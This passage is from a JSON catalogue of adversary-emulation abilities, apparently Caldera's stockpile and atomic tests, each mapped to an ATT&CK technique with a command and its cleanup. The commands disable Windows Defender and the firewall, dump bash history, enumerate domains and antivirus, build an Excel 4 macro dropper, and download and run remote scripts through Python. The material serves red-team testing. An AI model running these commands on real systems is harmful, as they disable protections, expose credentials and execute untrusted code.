                    "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 1 /f"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Disable Microsoft Defender Firewall via Registry",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b007f6e8-4a87-4440-8888-29ceab047d9b",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "Elevated",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "technique_id": "T1562.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Disable Windows Defender All",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Disable Windows Defender All",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "49470433-30ce-4714-a44b-bea9dbbeca9a",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "Elevated",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "technique_id": "T1562.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) { Set-MPPreference -DisableRealtimeMonitoring 0; } else { $service = Get-Service WinDefend -ErrorAction SilentlyContinue; if ($service) { Start-Service WinDefend; } else { echo \"Windows Defender service not found.\"; exit 1; }; };"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Disable Windows Defender Real-Time Protection",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Disable Windows Defender Real-Time Protection",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6d90e6fa-9324-4eb5-93be-9f737245bd7z",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "technique_id": "T1069.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.netlocalgroup",
                        "parserconfigs": [
                            {
                                "edge": "has_admin",
                                "target": "domain.user.name",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Discover Domain Admins",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "target.org.emailhost",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "target.org.emailhost",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "target.org.emailhost",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify the organizations mail server",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Discover Mail Server",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "technique_id": "T1518.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.antivirus",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.installed.av",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.installed.av",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify AV",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Discover antivirus programs",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nltest /dsgetdc:%USERDOMAIN%",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nltest /dsgetdc:$env:USERDOMAIN",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify the remote domain controllers",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Discover domain controller",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.process.id",
                                "custom_parser_vals": {
                                    "json_key": "Id",
                                    "json_type": "int"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Discover injectable process",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.gdomain",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Discover local hosts",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c6607391-d02c-44b5-9b13-d3492ca58599",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Service Discovery",
        "technique_id": "T1007",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Service",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify system services",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Discover system services",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Endpoint Denial of Service",
        "technique_id": "T1499",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "./wifi.sh on"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.sh off",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "wifi.sh"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "./wifi.sh on"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.sh off",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "wifi.sh"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    ".\\wifi.ps1 -On"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\wifi.ps1 -Off",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "wifi.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Turn a computers WIFI off",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Disrupt WIFI",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "422526ec-27e9-429a-995b-c686a29561a4",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "Unsecured Credentials: Bash History",
        "technique_id": "T1552.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ssh",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.ssh.cmd",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cat ~/.bash_history",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ssh",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.ssh.cmd",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get contents of bash history",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Dump history",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "f97de07a3b9e3b132f7bc42680151d81",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw; grep \"# THIS IS A COMMENT\" /etc/default/ufw",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Edit UFW firewall main configuration file",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "683115a2ceeb045e6ffbf4487322b220",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf; cat /etc/ufw/sysctl.conf"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Edit UFW firewall sysctl.conf file",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8a60db80ab6f4a6b1db758c95bacfafa",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf; cat /etc/ufw/ufw.conf"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Edit UFW firewall ufw.conf file",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a1e9351c7799d884d29a5e61712ab58e",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules; grep \"# THIS IS A COMMENT\" /etc/ufw/user.rules",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Edit UFW firewall user.rules file",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "Emulate-Administrator-Tasks.ps1"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"",
                "name": "pwsh",
                "parsers": [],
                "payloads": [
                    "Emulate-Administrator-Tasks.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Emulate administrator tasks on a system in a separate process",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Emulate Administrator Tasks",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "f1cce45585d407e267443dc271d89931",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Stop-Process -Name \"procexp*\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"; $fname1 = \"$env:TEMP\\procexp.exe\"; if (Test-Path $fname) {;   Remove-Item $fname;   Remove-Item $fname1; }; $xlApp = New-Object -COMObject \"Excel.Application\"; $xlApp.Visible = $True; $xlApp.DisplayAlerts = $False; $xlBook = $xlApp.Workbooks.Add(); $sheet = $xlBook.Excel4MacroSheets.Add(); if (\"$env:Username\" -ne \"\") {;   $sheet.Cells.Item(1,1) = \"$env:Username\"; } else {;   $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"; }; $sheet.Cells.Item(2,1) = \"procexp.exe\"; $sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"; $sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"; $sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"; $sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"; $sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"; $sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"; $sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"; $sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"; $sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"; $sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"; $sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"; $sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"; $sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"; $sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"; $sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"; $sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"; $sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"; $sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"; $sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"; $sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"; $sheet.Cells.Item(23,1) = \"=HALT()\"; $sheet.Cells.Item(1,1).Name = \"runme\"; $xlApp.Run(\"runme\"); $xlApp.Quit(); [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null; [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null; [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers(); Remove-Variable xlBook; Remove-Variable xlApp",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Excel 4 Macro",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3a2e6a17047b197b614f04a3811a5d4e",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Python",
        "technique_id": "T1059.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'; $which_python",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Execute Python via Python executables (Linux)",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d54db7e70848e3399876885192603ef8",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Python",
        "technique_id": "T1059.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Execute Python via scripts (Linux)",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3660cf36b4cac4ce733c30ef78b2ffb0",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "technique_id": "T1569.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del C:\\art-marker.txt >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sc.exe create ARTService binPath= \"%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" && sc.exe start ARTService && sc.exe delete ARTService",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Execute a Command as a Service",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "9c9c9c0eafe1c20e86c6364d2e5a6081",
        "buckets": [
            "execution"
        ],
        "privilege": "",
